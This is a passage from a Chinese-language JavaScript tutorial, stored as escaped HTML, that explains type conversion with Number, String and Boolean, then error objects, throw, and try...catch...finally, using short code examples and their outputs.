是一种动态类型语言，变量没有类型限制，可以随时赋予任意值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = y ? 1 : &#039;a&#039;;</code></pre><p>上面代码中，变量<code>x</code>到底是数值还是字符串，取决于另一个变量<code>y</code>的值。<code>y</code>为<code>true</code>时，<code>x</code>是一个数值；<code>y</code>为<code>false</code>时，<code>x</code>是一个字符串。这意味着，<code>x</code>的类型没法在编译阶段就知道，必须等到运行时才能知道。</p>\n<p>虽然变量的数据类型是不确定的，但是各种运算符对数据类型是有要求的。如果运算符发现，运算子的类型与预期不符，就会自动转换类型。比如，减法运算符预期左右两侧的运算子应该是数值，如果不是，就会自动将它们转为数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;4&#039; - &#039;3&#039; // 1</code></pre><p>上面代码中，虽然是两个字符串相减，但是依然会得到结果数值<code>1</code>，原因就在于 JavaScript 将运算子自动转为了数值。</p>\n<p>本章讲解数据类型自动转换的规则。在此之前，先讲解如何手动强制转换数据类型。</p>\n\n        <h2>\n            <a href='#强制转换' class='header-anchor'>#</a>\n            <span>强制转换</span>\n        </h2>\n    <p>强制转换主要指使用<code>Number()</code>、<code>String()</code>和<code>Boolean()</code>三个函数，手动将各种类型的值，分别转换成数字、字符串或者布尔值。</p>\n\n        <h3>\n            <a href='#Number()' class='header-anchor'>#</a>\n            <span>Number()</span>\n        </h3>\n    <p>使用<code>Number</code>函数，可以将任意类型的值转化成数值。</p>\n<p>下面分成两种情况讨论，一种是参数是原始类型的值，另一种是参数是对象。</p>\n<p><strong>（1）原始类型值</strong></p>\n<p>原始类型值的转换规则如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 数值：转换后还是原来的值\nNumber(324) // 324\n\n// 字符串：如果可以被解析为数值，则转换为相应的数值\nNumber(&#039;324&#039;) // 324\n\n// 字符串：如果不可以被解析为数值，返回 NaN\nNumber(&#039;324abc&#039;) // NaN\n\n// 空字符串转为0\nNumber(&#039;&#039;) // 0\n\n// 布尔值：true 转成 1，false 转成 0\nNumber(true) // 1\nNumber(false) // 0\n\n// undefined：转成 NaN\nNumber(undefined) // NaN\n\n// null：转成0\nNumber(null) // 0</code></pre><p><code>Number</code>函数将字符串转为数值，要比<code>parseInt</code>函数严格很多。基本上，只要有一个字符无法转成数值，整个字符串就会被转为<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;42 cats&#039;) // 42\nNumber(&#039;42 cats&#039;) // NaN</code></pre><p>上面代码中，<code>parseInt</code>逐个解析字符，而<code>Number</code>函数整体转换字符串的类型。</p>\n<p>另外，<code>parseInt</code>和<code>Number</code>函数都会自动过滤一个字符串前导和后缀的空格。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;\\t\\v\\r12.34\\n&#039;) // 12\nNumber(&#039;\\t\\v\\r12.34\\n&#039;) // 12.34</code></pre><p><strong>（2）对象</strong></p>\n<p>简单的规则是，<code>Number</code>方法的参数是对象时，将返回<code>NaN</code>，除非是包含单个数值的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number({a: 1}) // NaN\nNumber([1, 2, 3]) // NaN\nNumber([5]) // 5</code></pre><p>之所以会这样，是因为<code>Number</code>背后的转换规则比较复杂。</p>\n<p>第一步，调用对象自身的<code>valueOf</code>方法。如果返回原始类型的值，则直接对该值使用<code>Number</code>函数，不再进行后续步骤。</p>\n<p>第二步，如果<code>valueOf</code>方法返回的还是对象，则改为调用对象自身的<code>toString</code>方法。如果<code>toString</code>方法返回原始类型的值，则对该值使用<code>Number</code>函数，不再进行后续步骤。</p>\n<p>第三步，如果<code>toString</code>方法返回的是对象，就报错。</p>\n<p>请看下面的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {x: 1};\nNumber(obj) // NaN\n\n// 等同于\nif (typeof obj.valueOf() === &#039;object&#039;) {\n  Number(obj.toString());\n} else {\n  Number(obj.valueOf());\n}</code></pre><p>上面代码中，<code>Number</code>函数将<code>obj</code>对象转为数值。背后发生了一连串的操作，首先调用<code>obj.valueOf</code>方法, 结果返回对象本身；于是，继续调用<code>obj.toString</code>方法，这时返回字符串<code>[object Object]</code>，对这个字符串使用<code>Number</code>函数，得到<code>NaN</code>。</p>\n<p>默认情况下，对象的<code>valueOf</code>方法返回对象本身，所以一般总是会调用<code>toString</code>方法，而<code>toString</code>方法返回对象的类型字符串（比如<code>[object Object]</code>）。所以，会有下面的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number({}) // NaN</code></pre><p>如果<code>toString</code>方法返回的不是原始类型的值，结果就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  valueOf: function () {\n    return {};\n  },\n  toString: function () {\n    return {};\n  }\n};\n\nNumber(obj)\n// TypeError: Cannot convert object to primitive value</code></pre><p>上面代码的<code>valueOf</code>和<code>toString</code>方法，返回的都是对象，所以转成数值时会报错。</p>\n<p>从上例还可以看到，<code>valueOf</code>和<code>toString</code>方法，都是可以自定义的。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number({\n  valueOf: function () {\n    return 2;\n  }\n})\n// 2\n\nNumber({\n  toString: function () {\n    return 3;\n  }\n})\n// 3\n\nNumber({\n  valueOf: function () {\n    return 2;\n  },\n  toString: function () {\n    return 3;\n  }\n})\n// 2</code></pre><p>上面代码对三个对象使用<code>Number</code>函数。第一个对象返回<code>valueOf</code>方法的值，第二个对象返回<code>toString</code>方法的值，第三个对象表示<code>valueOf</code>方法先于<code>toString</code>方法执行。</p>\n\n        <h3>\n            <a href='#String()' class='header-anchor'>#</a>\n            <span>String()</span>\n        </h3>\n    <p><code>String</code>函数可以将任意类型的值转化成字符串，转换规则如下。</p>\n<p><strong>（1）原始类型值</strong></p>\n<ul>\n<li><strong>数值</strong>：转为相应的字符串。</li>\n<li><strong>字符串</strong>：转换后还是原来的值。</li>\n<li><strong>布尔值</strong>：<code>true</code>转为字符串<code>&quot;true&quot;</code>，<code>false</code>转为字符串<code>&quot;false&quot;</code>。</li>\n<li><strong>undefined</strong>：转为字符串<code>&quot;undefined&quot;</code>。</li>\n<li><strong>null</strong>：转为字符串<code>&quot;null&quot;</code>。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>String(123) // &quot;123&quot;\nString(&#039;abc&#039;) // &quot;abc&quot;\nString(true) // &quot;true&quot;\nString(undefined) // &quot;undefined&quot;\nString(null) // &quot;null&quot;</code></pre><p><strong>（2）对象</strong></p>\n<p><code>String</code>方法的参数如果是对象，返回一个类型字符串；如果是数组，返回该数组的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>String({a: 1}) // &quot;[object Object]&quot;\nString([1, 2, 3]) // &quot;1,2,3&quot;</code></pre><p><code>String</code>方法背后的转换规则，与<code>Number</code>方法基本相同，只是互换了<code>valueOf</code>方法和<code>toString</code>方法的执行顺序。</p>\n<ol>\n<li><p>先调用对象自身的<code>toString</code>方法。如果返回原始类型的值，则对该值使用<code>String</code>函数，不再进行以下步骤。</p>\n</li>\n<li><p>如果<code>toString</code>方法返回的是对象，再调用原对象的<code>valueOf</code>方法。如果<code>valueOf</code>方法返回原始类型的值，则对该值使用<code>String</code>函数，不再进行以下步骤。</p>\n</li>\n<li><p>如果<code>valueOf</code>方法返回的是对象，就报错。</p>\n</li>\n</ol>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>String({a: 1})\n// &quot;[object Object]&quot;\n\n// 等同于\nString({a: 1}.toString())\n// &quot;[object Object]&quot;</code></pre><p>上面代码先调用对象的<code>toString</code>方法，发现返回的是字符串<code>[object Object]</code>，就不再调用<code>valueOf</code>方法了。</p>\n<p>如果<code>toString</code>法和<code>valueOf</code>方法，返回的都是对象，就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  valueOf: function () {\n    return {};\n  },\n  toString: function () {\n    return {};\n  }\n};\n\nString(obj)\n// TypeError: Cannot convert object to primitive value</code></pre><p>下面是通过自定义<code>toString</code>方法，改变返回值的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>String({\n  toString: function () {\n    return 3;\n  }\n})\n// &quot;3&quot;\n\nString({\n  valueOf: function () {\n    return 2;\n  }\n})\n// &quot;[object Object]&quot;\n\nString({\n  valueOf: function () {\n    return 2;\n  },\n  toString: function () {\n    return 3;\n  }\n})\n// &quot;3&quot;</code></pre><p>上面代码对三个对象使用<code>String</code>函数。第一个对象返回<code>toString</code>方法的值（数值3），第二个对象返回的还是<code>toString</code>方法的值（<code>[object Object]</code>），第三个对象表示<code>toString</code>方法先于<code>valueOf</code>方法执行。</p>\n\n        <h3>\n            <a href='#Boolean()' class='header-anchor'>#</a>\n            <span>Boolean()</span>\n        </h3>\n    <p><code>Boolean</code>函数可以将任意类型的值转为布尔值。</p>\n<p>它的转换规则相对简单：除了以下五个值的转换结果为<code>false</code>，其他的值全部为<code>true</code>。</p>\n<ul>\n<li><code>undefined</code></li>\n<li><code>null</code></li>\n<li><code>-0</code>或<code>+0</code></li>\n<li><code>NaN</code></li>\n<li><code>&#39;&#39;</code>（空字符串）</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>Boolean(undefined) // false\nBoolean(null) // false\nBoolean(0) // false\nBoolean(NaN) // false\nBoolean(&#039;&#039;) // false</code></pre><p>注意，所有对象（包括空对象）的转换结果都是<code>true</code>，甚至连<code>false</code>对应的布尔对象<code>new Boolean(false)</code>也是<code>true</code>（详见《原始类型值的包装对象》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Boolean({}) // true\nBoolean([]) // true\nBoolean(new Boolean(false)) // true</code></pre><p>所有对象的布尔值都是<code>true</code>，这是因为 JavaScript 语言设计的时候，出于性能的考虑，如果对象需要计算才能得到布尔值，对于<code>obj1 &amp;&amp; obj2</code>这样的场景，可能会需要较多的计算。为了保证性能，就统一规定，对象的布尔值为<code>true</code>。</p>\n\n        <h2>\n            <a href='#自动转换' class='header-anchor'>#</a>\n            <span>自动转换</span>\n        </h2>\n    <p>下面介绍自动转换，它是以强制转换为基础的。</p>\n<p>遇到以下三种情况时，JavaScript 会自动转换数据类型，即转换是自动完成的，用户不可见。</p>\n<p>第一种情况，不同类型的数据互相运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>123 + &#039;abc&#039; // &quot;123abc&quot;</code></pre><p>第二种情况，对非布尔值类型的数据求布尔值。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (&#039;abc&#039;) {\n  console.log(&#039;hello&#039;)\n}  // &quot;hello&quot;</code></pre><p>第三种情况，对非数值类型的值使用一元运算符（即<code>+</code>和<code>-</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>+ {foo: &#039;bar&#039;} // NaN\n- [1, 2, 3] // NaN</code></pre><p>自动转换的规则是这样的：预期什么类型的值，就调用该类型的转换函数。比如，某个位置预期为字符串，就调用<code>String</code>函数进行转换。如果该位置即可以是字符串，也可能是数值，那么默认转为数值。</p>\n<p>由于自动转换具有不确定性，而且不易除错，建议在预期为布尔值、数值、字符串的地方，全部使用<code>Boolean</code>、<code>Number</code>和<code>String</code>函数进行显式转换。</p>\n\n        <h3>\n            <a href='#自动转换为布尔值' class='header-anchor'>#</a>\n            <span>自动转换为布尔值</span>\n        </h3>\n    <p>JavaScript 遇到预期为布尔值的地方（比如<code>if</code>语句的条件部分），就会将非布尔值的参数自动转换为布尔值。系统内部会自动调用<code>Boolean</code>函数。</p>\n<p>因此除了以下五个值，其他都是自动转为<code>true</code>。</p>\n<ul>\n<li><code>undefined</code></li>\n<li><code>null</code></li>\n<li><code>+0</code>或<code>-0</code></li>\n<li><code>NaN</code></li>\n<li><code>&#39;&#39;</code>（空字符串）</li>\n</ul>\n<p>下面这个例子中，条件部分的每个值都相当于<code>false</code>，使用否定运算符后，就变成了<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>if ( !undefined\n  &amp;&amp; !null\n  &amp;&amp; !0\n  &amp;&amp; !NaN\n  &amp;&amp; !&#039;&#039;\n) {\n  console.log(&#039;true&#039;);\n} // true</code></pre><p>下面两种写法，有时也用于将一个表达式转为布尔值。它们内部调用的也是<code>Boolean</code>函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 写法一\nexpression ? true : false\n\n// 写法二\n!! expression</code></pre>\n        <h3>\n            <a href='#自动转换为字符串' class='header-anchor'>#</a>\n            <span>自动转换为字符串</span>\n        </h3>\n    <p>JavaScript 遇到预期为字符串的地方，就会将非字符串的值自动转为字符串。具体规则是，先将复合类型的值转为原始类型的值，再将原始类型的值转为字符串。</p>\n<p>字符串的自动转换，主要发生在字符串的加法运算时。当一个值为字符串，另一个值为非字符串，则后者转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;5&#039; + 1 // &#039;51&#039;\n&#039;5&#039; + true // &quot;5true&quot;\n&#039;5&#039; + false // &quot;5false&quot;\n&#039;5&#039; + {} // &quot;5[object Object]&quot;\n&#039;5&#039; + [] // &quot;5&quot;\n&#039;5&#039; + function (){} // &quot;5function (){}&quot;\n&#039;5&#039; + undefined // &quot;5undefined&quot;\n&#039;5&#039; + null // &quot;5null&quot;</code></pre><p>这种自动转换很容易出错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  width: &#039;100&#039;\n};\n\nobj.width + 20 // &quot;10020&quot;</code></pre><p>上面代码中，开发者可能期望返回<code>120</code>，但是由于自动转换，实际上返回了一个字符<code>10020</code>。</p>\n\n        <h3>\n            <a href='#自动转换为数值' class='header-anchor'>#</a>\n            <span>自动转换为数值</span>\n        </h3>\n    <p>JavaScript 遇到预期为数值的地方，就会将参数值自动转换为数值。系统内部会自动调用<code>Number</code>函数。</p>\n<p>除了加法运算符（<code>+</code>）有可能把运算子转为字符串，其他运算符都会把运算子自动转成数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;5&#039; - &#039;2&#039; // 3\n&#039;5&#039; * &#039;2&#039; // 10\ntrue - 1  // 0\nfalse - 1 // -1\n&#039;1&#039; - 1   // 0\n&#039;5&#039; * []    // 0\nfalse / &#039;5&#039; // 0\n&#039;abc&#039; - 1   // NaN\nnull + 1 // 1\nundefined + 1 // NaN</code></pre><p>上面代码中，运算符两侧的运算子，都被转成了数值。</p>\n<blockquote>\n<p>注意：<code>null</code>转为数值时为<code>0</code>，而<code>undefined</code>转为数值时为<code>NaN</code>。</p>\n</blockquote>\n<p>一元运算符也会把运算子转成数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>+&#039;abc&#039; // NaN\n-&#039;abc&#039; // NaN\n+true // 1\n-false // 0</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2012/01/object-plus-object.html\">What is {} + {} in JavaScript?</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/04/quirk-implicit-conversion.html\">JavaScript quirk 1: implicit conversion of values</a></li>\n<li>Benjie Gillam, <a href=\"http://www.benjiegillam.com/2013/06/quantum-javascript/\">Quantum JavaScript?</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"语法专题","link":"javascript:void(0)"},{"title":"错误处理机制","link":"/features/error.html"}],"content":"\n        <h1>\n            <a href='#错误处理机制' class='header-anchor'>#</a>\n            <span>错误处理机制</span>\n        </h1>\n    \n        <h2>\n            <a href='#Error-实例对象' class='header-anchor'>#</a>\n            <span>Error 实例对象</span>\n        </h2>\n    <p>JavaScript 解析或运行时，一旦发生错误，引擎就会抛出一个错误对象。JavaScript 原生提供<code>Error</code>构造函数，所有抛出的错误都是这个构造函数的实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var err = new Error(&#039;出错了&#039;);\nerr.message // &quot;出错了&quot;</code></pre><p>上面代码中，我们调用<code>Error</code>构造函数，生成一个实例对象<code>err</code>。<code>Error</code>构造函数接受一个参数，表示错误提示，可以从实例的<code>message</code>属性读到这个参数。抛出<code>Error</code>实例对象以后，整个程序就中断在发生错误的地方，不再往下执行。</p>\n<p>JavaScript 语言标准只提到，<code>Error</code>实例对象必须有<code>message</code>属性，表示出错时的提示信息，没有提到其他属性。大多数 JavaScript 引擎，对<code>Error</code>实例还提供<code>name</code>和<code>stack</code>属性，分别表示错误的名称和错误的堆栈，但它们是非标准的，不是每种实现都有。</p>\n<ul>\n<li><strong>message</strong>：错误提示信息</li>\n<li><strong>name</strong>：错误名称（非标准属性）</li>\n<li><strong>stack</strong>：错误的堆栈（非标准属性）</li>\n</ul>\n<p>使用<code>name</code>和<code>message</code>这两个属性，可以对发生什么错误有一个大概的了解。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (error.name) {\n  console.log(error.name + &#039;: &#039; + error.message);\n}</code></pre><p><code>stack</code>属性用来查看错误发生时的堆栈。</p>\n<pre class=\"prettyprint language-javascript\"><code>function throwit() {\n  throw new Error(&#039;&#039;);\n}\n\nfunction catchit() {\n  try {\n    throwit();\n  } catch(e) {\n    console.log(e.stack); // print stack trace\n  }\n}\n\ncatchit()\n// Error\n//    at throwit (~/examples/throwcatch.js:9:11)\n//    at catchit (~/examples/throwcatch.js:3:9)\n//    at repl:1:5</code></pre><p>上面代码中，错误堆栈的最内层是<code>throwit</code>函数，然后是<code>catchit</code>函数，最后是函数的运行环境。</p>\n\n        <h2>\n            <a href='#原生错误类型' class='header-anchor'>#</a>\n            <span>原生错误类型</span>\n        </h2>\n    <p><code>Error</code>实例对象是最一般的错误类型，在它的基础上，JavaScript 还定义了其他6种错误对象。也就是说，存在<code>Error</code>的6个派生对象。</p>\n\n        <h3>\n            <a href='#SyntaxError-对象' class='header-anchor'>#</a>\n            <span>SyntaxError 对象</span>\n        </h3>\n    <p><code>SyntaxError</code>对象是解析代码时发生的语法错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 变量名错误\nvar 1a;\n// Uncaught SyntaxError: Invalid or unexpected token\n\n// 缺少括号\nconsole.log &#039;hello&#039;);\n// Uncaught SyntaxError: Unexpected string</code></pre><p>上面代码的错误，都是在语法解析阶段就可以发现，所以会抛出<code>SyntaxError</code>。第一个错误提示是“token 非法”，第二个错误提示是“字符串不符合要求”。</p>\n\n        <h3>\n            <a href='#ReferenceError-对象' class='header-anchor'>#</a>\n            <span>ReferenceError 对象</span>\n        </h3>\n    <p><code>ReferenceError</code>对象是引用一个不存在的变量时发生的错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 使用一个不存在的变量\nunknownVariable\n// Uncaught ReferenceError: unknownVariable is not defined</code></pre><p>另一种触发场景是，将一个值分配给无法分配的对象，比如对函数的运行结果或者<code>this</code>赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等号左侧不是变量\nconsole.log() = 1\n// Uncaught ReferenceError: Invalid left-hand side in assignment\n\n// this 对象不能手动赋值\nthis = 1\n// ReferenceError: Invalid left-hand side in assignment</code></pre><p>上面代码对函数<code>console.log</code>的运行结果和<code>this</code>赋值，结果都引发了<code>ReferenceError</code>错误。</p>\n\n        <h3>\n            <a href='#RangeError-对象' class='header-anchor'>#</a>\n            <span>RangeError 对象</span>\n        </h3>\n    <p><code>RangeError</code>对象是一个值超出有效范围时发生的错误。主要有几种情况，一是数组长度为负数，二是<code>Number</code>对象的方法参数超出范围，以及函数堆栈超过最大值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 数组长度不得为负数\nnew Array(-1)\n// Uncaught RangeError: Invalid array length</code></pre>\n        <h3>\n            <a href='#TypeError-对象' class='header-anchor'>#</a>\n            <span>TypeError 对象</span>\n        </h3>\n    <p><code>TypeError</code>对象是变量或参数不是预期类型时发生的错误。比如，对字符串、布尔值、数值等原始类型的值使用<code>new</code>命令，就会抛出这种错误，因为<code>new</code>命令的参数应该是一个构造函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>new 123\n// Uncaught TypeError: number is not a func\n\nvar obj = {};\nobj.unknownMethod()\n// Uncaught TypeError: obj.unknownMethod is not a function</code></pre><p>上面代码的第二种情况，调用对象不存在的方法，也会抛出<code>TypeError</code>错误，因为<code>obj.unknownMethod</code>的值是<code>undefined</code>，而不是一个函数。</p>\n\n        <h3>\n            <a href='#URIError-对象' class='header-anchor'>#</a>\n            <span>URIError 对象</span>\n        </h3>\n    <p><code>URIError</code>对象是 URI 相关函数的参数不正确时抛出的错误，主要涉及<code>encodeURI()</code>、<code>decodeURI()</code>、<code>encodeURIComponent()</code>、<code>decodeURIComponent()</code>、<code>escape()</code>和<code>unescape()</code>这六个函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>decodeURI(&#039;%2&#039;)\n// URIError: URI malformed</code></pre>\n        <h3>\n            <a href='#EvalError-对象' class='header-anchor'>#</a>\n            <span>EvalError 对象</span>\n        </h3>\n    <p><code>eval</code>函数没有被正确执行时，会抛出<code>EvalError</code>错误。该错误类型已经不再使用了，只是为了保证与以前代码兼容，才继续保留。</p>\n\n        <h3>\n            <a href='#总结' class='header-anchor'>#</a>\n            <span>总结</span>\n        </h3>\n    <p>以上这6种派生错误，连同原始的<code>Error</code>对象，都是构造函数。开发者可以使用它们，手动生成错误对象的实例。这些构造函数都接受一个函数，代表错误提示信息（message）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var err1 = new Error(&#039;出错了！&#039;);\nvar err2 = new RangeError(&#039;出错了，变量超出有效范围！&#039;);\nvar err3 = new TypeError(&#039;出错了，变量类型无效！&#039;);\n\nerr1.message // &quot;出错了！&quot;\nerr2.message // &quot;出错了，变量超出有效范围！&quot;\nerr3.message // &quot;出错了，变量类型无效！&quot;</code></pre>\n        <h2>\n            <a href='#自定义错误' class='header-anchor'>#</a>\n            <span>自定义错误</span>\n        </h2>\n    <p>除了 JavaScript 原生提供的七种错误对象，还可以定义自己的错误对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>function UserError(message) {\n  this.message = message || &#039;默认信息&#039;;\n  this.name = &#039;UserError&#039;;\n}\n\nUserError.prototype = new Error();\nUserError.prototype.constructor = UserError;</code></pre><p>上面代码自定义一个错误对象<code>UserError</code>，让它继承<code>Error</code>对象。然后，就可以生成这种自定义类型的错误了。</p>\n<pre class=\"prettyprint language-javascript\"><code>new UserError(&#039;这是自定义的错误！&#039;);</code></pre>\n        <h2>\n            <a href='#throw-语句' class='header-anchor'>#</a>\n            <span>throw 语句</span>\n        </h2>\n    <p><code>throw</code>语句的作用是手动中断程序执行，抛出一个错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (x &lt; 0) {\n  throw new Error(&#039;x 必须为正数&#039;);\n}\n// Uncaught ReferenceError: x is not defined</code></pre><p>上面代码中，如果变量<code>x</code>小于<code>0</code>，就手动抛出一个错误，告诉用户<code>x</code>的值不正确，整个程序就会在这里中断执行。可以看到，<code>throw</code>抛出的错误就是它的参数，这里是一个<code>Error</code>实例。</p>\n<p><code>throw</code>也可以抛出自定义错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>function UserError(message) {\n  this.message = message || &#039;默认信息&#039;;\n  this.name = &#039;UserError&#039;;\n}\n\nthrow new UserError(&#039;出错了！&#039;);\n// Uncaught UserError {message: &quot;出错了！&quot;, name: &quot;UserError&quot;}</code></pre><p>上面代码中，<code>throw</code>抛出的是一个<code>UserError</code>实例。</p>\n<p>实际上，<code>throw</code>可以抛出任何类型的值。也就是说，它的参数可以是任何值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 抛出一个字符串\nthrow &#039;Error！&#039;;\n// Uncaught Error！\n\n// 抛出一个数值\nthrow 42;\n// Uncaught 42\n\n// 抛出一个布尔值\nthrow true;\n// Uncaught true\n\n// 抛出一个对象\nthrow {\n  toString: function () {\n    return &#039;Error!&#039;;\n  }\n};\n// Uncaught {toString: ƒ}</code></pre><p>对于 JavaScript 引擎来说，遇到<code>throw</code>语句，程序就中止了。引擎会接收到<code>throw</code>抛出的信息，可能是一个错误实例，也可能是其他类型的值。</p>\n\n        <h2>\n            <a href='#try...catch-结构' class='header-anchor'>#</a>\n            <span>try...catch 结构</span>\n        </h2>\n    <p>一旦发生错误，程序就中止执行了。JavaScript 提供了<code>try...catch</code>结构，允许对错误进行处理，选择是否往下执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n  throw new Error(&#039;出错了!&#039;);\n} catch (e) {\n  console.log(e.name + &quot;: &quot; + e.message);\n  console.log(e.stack);\n}\n// Error: 出错了!\n//   at &lt;anonymous&gt;:3:9\n//   ...</code></pre><p>上面代码中，<code>try</code>代码块抛出错误（上例用的是<code>throw</code>语句），JavaScript 引擎就立即把代码的执行，转到<code>catch</code>代码块，或者说错误被<code>catch</code>代码块捕获了。<code>catch</code>接受一个参数，表示<code>try</code>代码块抛出的值。</p>\n<p>如果你不确定某些代码是否会报错，就可以把它们放在<code>try...catch</code>代码块之中，便于进一步对错误进行处理。</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n  f();\n} catch(e) {\n  // 处理错误\n}</code></pre><p>上面代码中，如果函数<code>f</code>执行报错，就会进行<code>catch</code>代码块，接着对错误进行处理。</p>\n<p><code>catch</code>代码块捕获错误之后，程序不会中断，会按照正常流程继续执行下去。</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n  throw &quot;出错了&quot;;\n} catch (e) {\n  console.log(111);\n}\nconsole.log(222);\n// 111\n// 222</code></pre><p>上面代码中，<code>try</code>代码块抛出的错误，被<code>catch</code>代码块捕获后，程序会继续向下执行。</p>\n<p><code>catch</code>代码块之中，还可以再抛出错误，甚至使用嵌套的<code>try...catch</code>结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = 100;\n\ntry {\n  throw n;\n} catch (e) {\n  if (e &lt;= 50) {\n    // ...\n  } else {\n    throw e;\n  }\n}\n// Uncaught 100</code></pre><p>上面代码中，<code>catch</code>代码之中又抛出了一个错误。</p>\n<p>为了捕捉不同类型的错误，<code>catch</code>代码块之中可以加入判断语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n  foo.bar();\n} catch (e) {\n  if (e instanceof EvalError) {\n    console.log(e.name + &quot;: &quot; + e.message);\n  } else if (e instanceof RangeError) {\n    console.log(e.name + &quot;: &quot; + e.message);\n  }\n  // ...\n}</code></pre><p>上面代码中，<code>catch</code>捕获错误之后，会判断错误类型（<code>EvalError</code>还是<code>RangeError</code>），进行不同的处理。</p>\n\n        <h2>\n            <a href='#finally-代码块' class='header-anchor'>#</a>\n            <span>finally 代码块</span>\n        </h2>\n    <p><code>try...catch</code>结构允许在最后添加一个<code>finally</code>代码块，表示不管是否出现错误，都必需在最后运行的语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>function cleansUp() {\n  try {\n    throw new Error(&#039;出错了……&#039;);\n    console.log(&#039;此行不会执行&#039;);\n  } finally {\n    console.log(&#039;完成清理工作&#039;);\n  }\n}\n\ncleansUp()\n// 完成清理工作\n// Error: 出错了……</code></pre><p>上面代码中，由于没有<code>catch</code>语句块，所以错误没有捕获。执行<code>finally</code>代码块以后，程序就中断在错误抛出的地方。</p>\n<pre class=\"prettyprint language-javascript\"><code>function idle(x) {\n  try {\n    console.log(x);\n    return &#039;result&#039;;\n  } finally {\n    console.log(&quot;FINALLY&quot;);\n  }\n}\n\nidle(&#039;hello&#039;)\n// hello\n// FINALLY\n// &quot;result&quot;</code></pre><p>上面代码说明，<code>try</code>代码块没有发生错误，而且里面还包括<code>return</code>语句，但是<code>finally</code>代码块依然会执行。注意，只有在其执行完毕后，才会显示<code>return</code>语句的值。</p>\n<p>下面的例子说明，<code>return</code>语句的执行是排在<code>finally</code>代码之前，只是等<code>finally</code>代码执行完毕后才返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>var count = 0;\nfunction countUp() {\n  try {\n    return count;\n  } finally {\n    count++;\n  }\n}\n\ncountUp()\n// 0\ncount\n// 1</code></pre><p>上面代码说明，<code>return</code>语句的<code>count</code>的值，是在<code>finally</code>代码块运行之前就获取了。</p>\n<p>下面是<code>finally</code>代码块用法的典型场景。</p>\n<pre class=\"prettyprint language-javascript\"><code>openFile();\n\ntry {\n  writeFile(Data);\n} catch(e) {\n  handleError(e);\n} finally {\n  closeFile();\n}</code></pre><p>上面代码首先打开一个文件，然后在<code>try</code>代码块中写入文件，如果没有发生错误，则运行<code>finally</code>代码块关闭文件；一旦发生错误，则先使用<code>catch</code>代码块处理错误，再使用<code>finally</code>代码块关闭文件。</p>\n<p>下面的例子充分反映了<code>try...catch...finally</code>这三者之间的执行顺序。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  try {\n    console.log(0);\n    throw &#039;bug&#039;;\n  } catch(e) {\n    console.log(1);\n    return true; // 这句原本会延迟到 finally 代码块结束再执行\n    console.log(2); // 不会运行\n  } finally {\n    console.log(3);\n    return false; // 这句会覆盖掉前面那句 return\n    console.log(4); // 不会运行\n  }\n\n  console.log(5); // 不会运行\n}\n\nvar result = f();\n// 0\n// 1\n// 3\n\nresult\n// false</code></pre><p>上面代码中，<code>catch</code>代码块结束执行之前，会先执行<code>finally</code>代码块。</p>\n<p><code>catch</code>代码块之中，触发转入<code>finally</code>代码快的标志，不仅有<code>return</code>语句，还有<code>throw</code>语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  try {\n    throw &#039;出错了！&#039;;\n  } catch(e) {\n    console.log(&#039;捕捉到内部错误&#039;);\n    throw e; // 这句原本会等到finally结束再执行\n  } finally {\n    return false; // 直接返回\n  }\n}\n\ntry {\n  f();\n} catch(e) {\n  // 此处不会执行\n  console.log(&#039;caught outer &quot;bogus&quot;&#039;);\n}\n\n//  